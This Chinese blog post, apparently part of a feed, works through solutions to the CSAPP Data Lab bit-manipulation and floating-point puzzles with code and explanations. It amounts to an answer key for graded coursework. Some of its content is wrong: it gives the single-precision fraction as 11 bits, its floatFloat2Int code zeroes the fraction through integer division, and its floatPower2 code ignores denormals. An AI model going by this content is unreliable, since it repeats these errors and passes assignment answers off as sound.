&lt;p&gt;这里我使用的方法是将该数拆分为最低位和其他位来比较。我们将最低位与&lt;code&gt;0xa&lt;/code&gt;相减，如果求得的结果为负数，符号位即为 1，代表该值在 0-9 之间。接下来判断其他位是否为&lt;code&gt;0x3&lt;/code&gt;，如果是，则和&lt;code&gt;0x3&lt;/code&gt;异或结果为 0，通过逻辑&lt;code&gt;!&lt;/code&gt;返回 1。&lt;/p&gt;
&lt;h2 id=&#34;conditional&#34;&gt;&lt;a href=&#34;#conditional&#34; class=&#34;headerlink&#34; title=&#34;conditional&#34;&gt;&lt;/a&gt;conditional&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * conditional - same as x ? y : z
 *   Example: conditional(2,4,5) = 4
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 16
 *   Rating: 3
 */
int conditional(int x, int y, int z)
&amp;#123;
   /**
    * judge if x != 0, if true, !!x = 1, return y, otherwise !!x = 0, return z
    */

   // cond gets all f when !!x == 1
   int cond = ((!!x) &amp;lt;&amp;lt; 31) &amp;gt;&amp;gt; 31;
   return (cond &amp;amp; y) | (~cond &amp;amp; z);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们先获取&lt;code&gt;x&lt;/code&gt;的值，如果&lt;code&gt;x != 0&lt;/code&gt;，则&lt;code&gt;!!x = 0x1&lt;/code&gt;，否则为&lt;code&gt;0x0&lt;/code&gt;。扩展该值，当该值为&lt;code&gt;0x1&lt;/code&gt;时与&lt;code&gt;y&lt;/code&gt;相与得到 y。当该值为&lt;code&gt;0x0&lt;/code&gt;，取反后与 z 相与得到 z。因为这两个值只取其一，当一边不为 0 时另一边必然为 0，因此两边用&lt;code&gt;|&lt;/code&gt;连接。&lt;/p&gt;
&lt;h2 id=&#34;isLessOrEqual&#34;&gt;&lt;a href=&#34;#isLessOrEqual&#34; class=&#34;headerlink&#34; title=&#34;isLessOrEqual&#34;&gt;&lt;/a&gt;isLessOrEqual&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本题要求使用最多 24 个运算符，但是这里我使用的过多了，应该会有更好的办法。期待有人指正。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * isLessOrEqual - if x &amp;lt;= y  then return 1, else return 0
 *   Example: isLessOrEqual(4,5) = 1.
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 24
 *   Rating: 3
 */
int isLessOrEqual(int x, int y)
&amp;#123;
   // first compare their sign bit
   int sign_x = (x &amp;gt;&amp;gt; 31) &amp;amp; 0x1;
   int sign_y = (y &amp;gt;&amp;gt; 31) &amp;amp; 0x1;
   // return true if sign = 1(&amp;gt;0)
   int sign_diff = sign_x + (~sign_y + 1);
   int sign_bit = (sign_diff &amp;gt;&amp;gt; 31) &amp;amp; 0x1;

   // then compare the magnitude
   int mask = (~0) + (0x1 &amp;lt;&amp;lt; 31);
   int mag_x = x &amp;amp; mask;
   int mag_y = y &amp;amp; mask;
   int mag_diff = mag_x + (~mag_y + 1);
   int mag_sign = !(mag_x ^ mag_y) | ((mag_diff &amp;gt;&amp;gt; 31) &amp;amp; 0x1);

   /**
    * 2 conditions return true:
    * 1. sign of x = 1 and sign of y = 0
    * 2. sign of x and y equals, and magnitude of x &amp;lt;= y
    */
   return (((!sign_bit) &amp;amp; sign_diff) | ((!sign_diff) &amp;amp; mag_sign));
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里要分几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;x 为负数，y 为正数，直接返回&lt;code&gt;0x1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;x 和 y 同符号，比较数值部分。x &amp;lt;&amp;#x3D; y 时，返回&lt;code&gt;0x1&lt;/code&gt;；x &amp;gt; y 时，返回&lt;code&gt;0x0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;x 为正数，y 为负数，返回&lt;code&gt;0x0&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中&lt;code&gt;sign_diff&lt;/code&gt;为两数符号位之差，此处分三种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;x 为负数，符号位为 1；y 为正数，符号位为 0。那么两者符号位相减等于&lt;code&gt;0x1&lt;/code&gt;，该值的符号位为 0。（这是我们要返回&lt;code&gt;0x1&lt;/code&gt;的结果）&lt;/li&gt;
&lt;li&gt;x 为正数，符号位为 0；y 为负数，符号位为 1。那么两者符号位相减等于&lt;code&gt;0xffffffff&lt;/code&gt;(-1)，该值的符号位为 1。（我们不要这个结果）&lt;/li&gt;
&lt;li&gt;x 和 y 的符号位相同，两者相减为&lt;code&gt;0x0&lt;/code&gt;，该值的符号位为 0。（这里我们要看情况，看&lt;code&gt;x&lt;/code&gt;是否和&lt;code&gt;y&lt;/code&gt;相等）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;代码中&lt;code&gt;sign_diff&lt;/code&gt;为两符号位之差，&lt;code&gt;sign_bit&lt;/code&gt;为该做差结果的最高位。当 x 和 y 的符号位不相同时，当&lt;code&gt;sign_diff&lt;/code&gt;为&lt;code&gt;0x1&lt;/code&gt;且&lt;code&gt;sign_bit&lt;/code&gt;为&lt;code&gt;0x0&lt;/code&gt;是，我们返回&lt;code&gt;0x1&lt;/code&gt;。这也是运算结果&lt;code&gt;|&lt;/code&gt;左半边的由来。&lt;/p&gt;
&lt;p&gt;代码中&lt;code&gt;mag_diff&lt;/code&gt;为两者数值部分之差，&lt;code&gt;mag_sign&lt;/code&gt;为该差值的符号位。当&lt;code&gt;x &amp;lt; y&lt;/code&gt;时，&lt;code&gt;mag_diff&lt;/code&gt;为&lt;code&gt;0xffffffff&lt;/code&gt;。当&lt;code&gt;x == y&lt;/code&gt;时，&lt;code&gt;!(mag_x ^ mag_y)&lt;/code&gt;为&lt;code&gt;0x1&lt;/code&gt;。因此&lt;code&gt;mag_sign = !(mag_x ^ mag_y) | ((mag_diff &amp;gt;&amp;gt; 31) &amp;amp; 0x1)&lt;/code&gt;。在判断数值之差部分时，我们需要保证两数符号位之差为&lt;code&gt;0x0&lt;/code&gt;，而不是其他（如 x 正 y 负）。因此运算结果右半边的值为&lt;code&gt;(!sign_diff) &amp;amp; mag_sign&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;综上，最后的结果是&lt;code&gt;((!sign_bit) &amp;amp; sign_diff) | ((!sign_diff) &amp;amp; mag_sign)&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;logicalNeg&#34;&gt;&lt;a href=&#34;#logicalNeg&#34; class=&#34;headerlink&#34; title=&#34;logicalNeg&#34;&gt;&lt;/a&gt;logicalNeg&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * logicalNeg - implement the ! operator, using all of
 *              the legal operators except !
 *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
 *   Legal ops: ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 12
 *   Rating: 4
 */
int logicalNeg(int x)
&amp;#123;
   /**
    * if x == 0, x ^ 0x0 = 0
    */
   return ((x | (x + ~0 + (~(1 &amp;lt;&amp;lt; 31) + 1))) &amp;gt;&amp;gt; 31) + 1;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这道题的难点在于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将 0 映射到 0x1&lt;/li&gt;
&lt;li&gt;将非 0 值映射到 0x0&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在一开始实现时，我的思路是对于 0，可以和&lt;code&gt;0x0&lt;/code&gt;异或，判断为 0。但是对于非 0 的数，和&lt;code&gt;0x0&lt;/code&gt;异或后还是他自己，我们也不知道 1 落在其中哪个位上，一个个位去找也不现实。那么就需要思考其他的办法。从&lt;code&gt;0x0&lt;/code&gt;这个数和其他数的特点下手。这里我参考了&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==&#34;&gt;这篇博客&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;其给出的思路是：&lt;br&gt;-x 为 x 按位取反再+1。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果一个数为全 0，和相反数相&lt;code&gt;|&lt;/code&gt;后结果全部是 0，加 1 后得到&lt;code&gt;0x1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则结果最高位必然含有 1。向右移动 31 位获得&lt;code&gt;~0&lt;/code&gt;，再加 1 得到&lt;code&gt;0x0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;问题可改为，如何判断一个数全为 0 。注意到，-x 相当于按位取反再加一，如果 x 为 非 0 数，那么 x|(-x) 后必定为 -1 。利用这个性质，即可判断是否为 0 。&lt;/p&gt;
&lt;h2 id=&#34;howManyBits&#34;&gt;&lt;a href=&#34;#howManyBits&#34; class=&#34;headerlink&#34; title=&#34;howManyBits&#34;&gt;&lt;/a&gt;howManyBits&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/* howManyBits - return the minimum number of bits required to represent x in
 *             two&amp;#39;s complement
 *  Examples: howManyBits(12) = 5
 *            howManyBits(298) = 10
 *            howManyBits(-5) = 4
 *            howManyBits(0)  = 1
 *            howManyBits(-1) = 1
 *            howManyBits(0x80000000) = 32
 *  Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *  Max ops: 90
 *  Rating: 4
 */
int howManyBits(int x)
&amp;#123;
   /**
    * divide and conquer
    * for positive number, the number of bits = the last position of 1 + 1
    * for negative number, the number of bits = the last position of 1
    * inverse negative number and deal with it as the same as positive number
    * 1. judge the sign bit of x, if x is negative, inverse it
    * 2. judge the high 16 bits, if true(high 16 bits != 0x0), result + 16
    * 3. judge the high 8 bits, if true, result + 8
    * 4. judge the high 4 bits, if true, result + 4
    * 5. judge the high 2 bits, if true, result + 2
    * 6. judge the high 1 bits, if true, result + 1
    * 7. judge the last 1 bit, if true, result + !!x
    * 8. the final sum must + 1
    * 9. return the result
    */
   // neg x if it&amp;#39;s negative
   int sign = ((x &amp;amp; (1 &amp;lt;&amp;lt; 31)) &amp;gt;&amp;gt; 31);
   x = (sign &amp;amp; ~x) | (~sign &amp;amp; x);

   int b16, b8, b4, b2, b1, b0;

   // int mask_16 = (1 &amp;lt;&amp;lt; 15) &amp;gt;&amp;gt; 15;
   b16 = !!(x &amp;gt;&amp;gt; 16) &amp;lt;&amp;lt; 4;
   x = x &amp;gt;&amp;gt; b16;

   // int mask_8 = 0xff;
   b8 = !!(x &amp;gt;&amp;gt; 8) &amp;lt;&amp;lt; 3;
   x = x &amp;gt;&amp;gt; b8;

   // int mask_4 = 0xf;
   b4 = !!(x &amp;gt;&amp;gt; 4) &amp;lt;&amp;lt; 2;
   x = x &amp;gt;&amp;gt; b4;

   // int mask_2 = 0x3;
   b2 = !!(x &amp;gt;&amp;gt; 2) &amp;lt;&amp;lt; 1;
   x = x &amp;gt;&amp;gt; b2;

   // int mask_1 = 0x1;
   b1 = !!(x &amp;gt;&amp;gt; 1);
   x = x &amp;gt;&amp;gt; b1;

   //! judge if the last bit == 1
   b0 = !!x;

   return b16 + b8 + b4 + b2 + b1 + b0 + 1;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这个题目中，我们主要采用分而治之的方法。分治方法的几道例题可以参考 CMU 15-213 课程的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwMV9zb2x1dGlvbnMucGRm&#34;&gt;Recitation Slides&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;首先，我们可以看到，如果该数是一个正数，则其最高位必然是 0，该数的位数 &amp;#x3D; 最高一个 1 的位置 + 1；&lt;br&gt;如果该数是一个负数，该数的位数 &amp;#x3D; 最高一个 1 的位置。&lt;br&gt;我们不想那么麻烦，把正负数分开讨论，因此我们把负数翻转过来。&lt;/p&gt;
&lt;p&gt;在这道题中我们采用的方法是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判断高 16 位是否有 1（把数向右移动 16 位后，结果不为 0，&lt;code&gt;!!(x &amp;gt;&amp;gt; 16)&lt;/code&gt;）。&lt;code&gt;b16 = !!(x &amp;gt;&amp;gt; 16) &amp;lt;&amp;lt; 4&lt;/code&gt;。如果是的话，把数值向右移动 16 位&lt;code&gt;(x&amp;gt;&amp;gt;b16)&lt;/code&gt;。把&lt;code&gt;b16&lt;/code&gt;添加到结果中去。这里一个妙用在于如果&lt;code&gt;!!(x &amp;gt;&amp;gt; 16）= 0x1&lt;/code&gt;，&lt;code&gt;!!(x &amp;gt;&amp;gt; 16) &amp;lt;&amp;lt; 4&lt;/code&gt;可以直接起到获得数字 16 的方法，无需增加其他的运算。&lt;/li&gt;
&lt;li&gt;判断高 8 位是否有 1，操作同上&lt;/li&gt;
&lt;li&gt;判断高 4 位是否有 1，操作同上&lt;/li&gt;
&lt;li&gt;判断高 2 位是否有 1，操作同上&lt;/li&gt;
&lt;li&gt;判断高 1 位是否有 1，操作同上&lt;/li&gt;
&lt;li&gt;判断该位是否有 1&lt;/li&gt;
&lt;li&gt;结果 + 1（位数 &amp;#x3D; 最高一个 1 的位置 + 1）&lt;/li&gt;
&lt;li&gt;最后把所有判断结果加起来（每次判断的结果都是一个累加的位数，加在一起就是最后的总位数）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;浮点数复习&#34;&gt;&lt;a href=&#34;#浮点数复习&#34; class=&#34;headerlink&#34; title=&#34;浮点数复习&#34;&gt;&lt;/a&gt;浮点数复习&lt;/h2&gt;&lt;p&gt;在完成浮点数部分的题目之前，我们需要复习一下浮点数的和其表示方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单精度浮点数：1 位符号位 + 8 位阶码(exp) + 11 位尾数(frac)&lt;/li&gt;
&lt;li&gt;双精度浮点数：1 位符号位 + 11 位阶码(exp) + 52 位尾数(frac)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中阶码使用移码表示。$bias &amp;#x3D; 2^{k-1}-1$&lt;/p&gt;
&lt;p&gt;浮点数分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;规格化数：阶码不全为 1 也不全为 0，尾数前有隐含的 1，指数$E&amp;#x3D;exp - bias$，分布在非规格化数外侧&lt;/li&gt;
&lt;li&gt;非规格化数：阶码全为 0，尾数前隐含 0，指数$E&amp;#x3D;1 - bias$，主要分布在靠近 0 侧&lt;/li&gt;
&lt;li&gt;特殊值：阶码全为 1，若尾数全为 0，则为&lt;code&gt;inf&lt;/code&gt;，否则为&lt;code&gt;NaN&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;floatScale2&#34;&gt;&lt;a href=&#34;#floatScale2&#34; class=&#34;headerlink&#34; title=&#34;floatScale2&#34;&gt;&lt;/a&gt;floatScale2&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;// float
/*
 * floatScale2 - Return bit-level equivalent of expression 2*f for
 *   floating point argument f.
 *   Both the argument and result are passed as unsigned int&amp;#39;s, but
 *   they are to be interpreted as the bit-level representation of
 *   single-precision floating point values.
 *   When argument is NaN, return argument
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
unsigned floatScale2(unsigned uf)
&amp;#123;
   // first get the sign, exp and mag bit of the number
   unsigned sign = (uf &amp;gt;&amp;gt; 31) &amp;amp; 0x1;
   unsigned e = (uf &amp;gt;&amp;gt; 23) &amp;amp; ((1 &amp;lt;&amp;lt; 8) - 1);
   unsigned f = (uf &amp;amp; ((1 &amp;lt;&amp;lt; 23) - 1));

   if (e == 0)
   &amp;#123;
      // denormalized number
      // E = 1 - bias
      // frac = f

      //! how to multiply a denormalized number? frac * 2!
      f = f * 2;
   &amp;#125;
   else if (e == 0xff)
   &amp;#123;
      // special number
      // if frac = 0, then value = inf
      if (f == 0)
      &amp;#123;
         // frac = 1 / 0;
         return uf;
      &amp;#125;
      else
      &amp;#123;
         // if frac != 0, value = NaN
         return uf;
      &amp;#125;
   &amp;#125;
   else
   &amp;#123;
      // normalized number
      // E = e - bias
      // value = 1 + f

      e += 1;
      if (e == ~0)
      &amp;#123;
         return uf;
      &amp;#125;
   &amp;#125;

   return (sign &amp;lt;&amp;lt; 31) | (e &amp;lt;&amp;lt; 23) | f;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题目要求是计算一个 unsigned 形式表示的浮点数 &lt;code&gt;* 2&lt;/code&gt; 后的表示。在完成这题之前，我们首先把浮点数的几个部分提取出来，分几个情况讨论：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非规格化数：指数不变，尾数乘 2。&lt;strong&gt;问题来了，这到底是为什么？因为当exp全为0时，exp &amp;#x3D; 0, E &amp;#x3D; 1 - bias, frac &amp;#x3D; 0.f。乘以2就相当于把f左移一位，最高位会进到exp的位置去。如果f最高位是0，左移一位不影响exp（全0）。如果f最高位是1，左移一位后该数变为规格化数，exp变为1，E依然等于 1 - bias。实现了非规格化数到规格化数的平滑过渡（非常重要！）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;规格化数：首先将指数 + 1，然后判断是否为特殊值，若是则返回&lt;code&gt;uf&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;特殊值：&lt;code&gt;e = 0&lt;/code&gt;，直接返回&lt;code&gt;uf&lt;/code&gt;（根据题目意思）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;将符号位，指数和尾数三个部分拼凑起来，直接返回（本题中无需进行任何计算）。&lt;/p&gt;
&lt;h2 id=&#34;floatFloat2Int&#34;&gt;&lt;a href=&#34;#floatFloat2Int&#34; class=&#34;headerlink&#34; title=&#34;floatFloat2Int&#34;&gt;&lt;/a&gt;floatFloat2Int&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本题中不允许使用&lt;code&gt;double&lt;/code&gt;类型，我擅自用了，这里应该是不严谨的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * floatFloat2Int - Return bit-level equivalent of expression (int) f
 *   for floating point argument f.
 *   Argument is passed as unsigned int, but
 *   it is to be interpreted as the bit-level representation of a
 *   single-precision floating point value.
 *   Anything out of range (including NaN and infinity) should return
 *   0x80000000u.
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
int floatFloat2Int(unsigned uf)
&amp;#123;
   // first get the sign, exp and mag bit of the number
   unsigned sign = (uf &amp;gt;&amp;gt; 31) &amp;amp; 0x1;
   unsigned e = (uf &amp;gt;&amp;gt; 23) &amp;amp; ((1 &amp;lt;&amp;lt; 8) - 1);
   float f = (uf &amp;amp; ((1 &amp;lt;&amp;lt; 23) - 1)) / (1 &amp;lt;&amp;lt; 23);

   // then get the exact sign, E and value of the number
   int s = 0;
   if (sign == 0)
      s = 1;
   else
      s = -1;

   int E = 0;
   float frac = 0;
   int bias = 127;
   if (e == 0)
   &amp;#123;
      // denormalized number
      // E = 1 - bias
      E = 1 - bias;
      // frac = f
      frac = f;
   &amp;#125;
   else if (e == 0xff)
   &amp;#123;
      //! COMPARE WITH 0XFF INSTEAD OF ~0
      // special number
      // if frac = 0, then value = inf
      if (f == 0)
      &amp;#123;
         // frac = 1 / 0;
         return 0x80000000u;
      &amp;#125;
      else
      &amp;#123;
         // if frac != 0, value = NaN
         return 0x80000000u;
      &amp;#125;
   &amp;#125;
   else
   &amp;#123;
      // normalized number
      // E = e - bias
      E = e - bias;
      // value = 1 + f
      frac = 1 + f;
   &amp;#125;
   if (E &amp;lt; 0)
   &amp;#123;
      return 0;
   &amp;#125;
   else if (E &amp;gt; 31)
   &amp;#123;
      //! REMEMBER THE SITUATION THAT E &amp;gt; 31
      return 0x80000000u;
   &amp;#125;

   return s * frac * (1 &amp;lt;&amp;lt; E);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题需要返回浮点数转化后的 int 类型数值。需要我们对浮点数的结构有所了解，并且其转化为 int 后需要切割掉小数部分，此外，我们还需要判断指数过大的情况（溢出）。&lt;/p&gt;
&lt;p&gt;本题中我们采用的步骤是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提取出浮点数三个部分，计算符号位的值&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;e == 0&lt;/code&gt;时，为特殊值的情况，&lt;code&gt;E = 1 - bias&lt;/code&gt;，&lt;code&gt;frac = f&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;e == 0xff&lt;/code&gt;时（注意不是&lt;code&gt;~0/0xffffffff&lt;/code&gt;,容易写错！），返回&lt;code&gt;0x80000000u&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;以上两种情况都不是，则该数为规格化数，&lt;code&gt;E = e - bias; frac = 1 + f;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后，我们需要进行&lt;strong&gt;特殊情况的分类讨论&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;E &amp;lt; 0, 则最后生成的结果（无论规格化还是非规格化）肯定是个小数，打头的是 0 那种，要切割为&lt;code&gt;int&lt;/code&gt;类型，小数部分就被切割掉了&lt;/li&gt;
&lt;li&gt;E &amp;gt; 31, 超过了指数可以表示的范围（算是溢出了？），返回&lt;code&gt;0x80000000u&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;正常情况下返回&lt;code&gt;s * frac * (1 &amp;lt;&amp;lt; E)&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;floatPower2&#34;&gt;&lt;a href=&#34;#floatPower2&#34; class=&#34;headerlink&#34; title=&#34;floatPower2&#34;&gt;&lt;/a&gt;floatPower2&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * floatPower2 - Return bit-level equivalent of the expression 2.0^x
 *   (2.0 raised to the power x) for any 32-bit integer x.
 *
 *   The unsigned value that is returned should have the identical bit
 *   representation as the single-precision floating-point number 2.0^x.
 *   If the result is too small to be represented as a denorm, return
 *   0. If too large, return +INF.
 *
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. Also if, while
 *   Max ops: 30
 *   Rating: 4
 */
unsigned floatPower2(int x)
&amp;#123;
   //! REMEMEBER THAT FLOATING POINT ITSELF IS IN THE FORMAT (-1)^S * M * 2.0^E
   // fit x into E
   x = x + 127;
   //! MIND THE SITUATION THAT X IS TOO LARGE OR TOO SMALL
   if (x &amp;gt;= 0xff)
      x = 0xff;
   else if (x &amp;lt;= 0)
      x = 0;
   unsigned result = (x &amp;lt;&amp;lt; 23);
   return result;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为浮点数表示法本身就是以 2 为底，所以本实验就相当于如何把 x 转化为那个 8 位的阶码。因为&lt;code&gt;阶码 = 指数 + bias&lt;/code&gt;，这里&lt;code&gt;bias = 127&lt;/code&gt;，因此这里&lt;code&gt;E = x + 127&lt;/code&gt;。然后和上一题一样，我们需要判断一下 x 的范围是否在&lt;code&gt;0xff&lt;/code&gt;和&lt;code&gt;0&lt;/code&gt;之间。最后将 x 移动到阶码的位置返回(&lt;code&gt;return x &amp;lt;&amp;lt; 23&lt;/code&gt;)即可。&lt;/p&gt;
&lt;h2 id=&#34;参考实现&#34;&gt;&lt;a href=&#34;#参考实现&#34; class=&#34;headerlink&#34; title=&#34;参考实现&#34;&gt;&lt;/a&gt;参考实现&lt;/h2&gt;&lt;p&gt;在完成 data lab 过程中，我参考了部分如下几个博客的实现:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=&#34;&gt;CSAPP 实验一：DataLab 详细讲解与满分代码&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDk4Nzc0NzU=&#34;&gt;lab1 CSAPP：datalab&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NTc0ODExMTI=&#34;&gt;CSAPP lab1: datalab&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==&#34;&gt;深入理解计算机系统之位操作实验&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vanlpMnlhL3AvMTU4ODExNzUuaHRtbA==&#34;&gt;CSAPP Data Lab 做题记录（下&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <updated>2024-02-05T07:50:22.000Z</updated>
    </entry>
</feed>
